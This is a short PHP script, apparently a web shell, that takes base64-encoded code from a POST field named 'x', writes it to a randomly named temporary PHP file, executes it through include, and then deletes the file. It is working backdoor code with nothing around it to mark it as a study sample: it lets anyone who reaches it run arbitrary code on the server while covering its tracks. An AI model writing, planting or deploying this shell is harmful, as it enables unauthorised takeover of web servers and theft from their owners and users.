<?php
$p=base64_decode($_POST['x']);
$t=sys_get_temp_dir().'/'.md5(mt_rand()).'.php';
file_put_contents($t,'<?php '.$p.';');
include($t);
unlink($t);
?>